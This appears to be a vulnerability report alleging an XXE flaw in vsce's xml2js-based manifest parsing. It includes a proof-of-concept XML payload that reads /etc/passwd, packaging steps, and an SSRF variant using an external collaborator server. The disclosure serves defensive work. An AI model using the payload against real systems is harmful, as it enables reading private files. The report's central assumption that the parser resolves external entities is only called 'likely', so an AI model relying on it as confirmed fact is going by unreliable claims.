### Vulnerability List

- Vulnerability Name: XML External Entity (XXE) Injection
- Description:
    1. An attacker crafts a malicious VSIX package containing an `extension.vsixmanifest` file with an XML External Entity (XXE) payload.
    2. The attacker publishes or attempts to package this malicious VSIX using `vsce`.
    3. `vsce` uses `xml2js.parseString` in `src/xml.ts` to parse the `extension.vsixmanifest` file.
    4. Because `xml2js` is used with default settings (likely without disabling external entities), the XXE payload is processed.
    5. This allows the attacker to potentially:
        - Read local files on the server where `vsce` is running.
        - Trigger Server-Side Request Forgery (SSRF) attacks.
- Impact: High
    - An attacker could potentially read sensitive files from the system running `vsce`, such as configuration files, source code, or credentials if `vsce` is running in an automated CI/CD pipeline or a developer's machine with sensitive files accessible.
    - SSRF could be used to access internal services or external resources from the `vsce` server, potentially leading to further attacks.
- Vulnerability rank: High
- Currently implemented mitigations: None
- Missing mitigations:
    - Configure `xml2js.parseString` with secure settings to disable external entities: `{ sax: { externalEntities: false } }`.
- Preconditions:
    - Attacker needs to be able to provide a malicious VSIX package to `vsce`. This could happen if an attacker can publish a malicious extension to the marketplace (less likely) or if a developer uses `vsce package` on a maliciously crafted extension project.
- Source code analysis:
    - In `/code/src/xml.ts`, the `parseXmlManifest` and `parseContentTypes` functions utilize `xml2js.parseString` without specifying any options. This default usage of `xml2js` is susceptible to XXE vulnerabilities.
    ```typescript
    import { promisify } from 'util';
    import { parseString } from 'xml2js';

    function createXMLParser<T>(): (raw: string) => Promise<T> {
        return promisify<string, T>(parseString); // Vulnerable: xml2js default settings are used
    }

    export const parseXmlManifest = createXMLParser<XMLManifest>();
    export const parseContentTypes = createXMLParser<ContentTypes>();
    ```
    - The `readVSIXPackage` function in `/code/src/zip.ts` calls the vulnerable `parseXmlManifest` function to process the `extension.vsixmanifest` file from a VSIX package.
    ```typescript
    export async function readVSIXPackage(packagePath: string): Promise<{ manifest: ManifestPackage; xmlManifest: XMLManifest }> {
        // ...
        return {
            manifest: manifestValidated,
            xmlManifest: await parseXmlManifest(rawXmlManifest.toString('utf8')), // Calls vulnerable parser
        };
    }
    ```
- Security test case:
    1. Create a file named `malicious.xml` with the following XXE payload:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011" xmlns:d="http://schemas.microsoft.com/developer/vsx-schema-design/2011">
        <Metadata>
            <Identity Language="en-US" Id="test" Version="0.0.1" Publisher="mocha"/>
            <DisplayName>Test Extension</DisplayName>
            <Description>&xxe;</Description> <Categories>Other</Categories>
        </Metadata>
        <Installation> <InstallationTarget Id="Microsoft.VisualStudio.Code"/> </Installation> <Dependencies/> <Assets/>
    </PackageManifest>
    ```
    2. Create a zip archive named `malicious.vsix` and place `malicious.xml` inside it, renaming `malicious.xml` to `extension.vsixmanifest` within the archive.
    3. Run the command `npx @vscode/vsce package --packagePath malicious.vsix`.
    4. If the `/etc/passwd` file content is included in the command output or an error related to file access is observed, it confirms the XXE vulnerability.
    5. To further confirm and potentially demonstrate SSRF, replace the entity declaration in `malicious.xml` with a URL to a controlled external server (e.g., using Burp Suite Collaborator) and observe if a request is made to that server when running the `vsce package` command.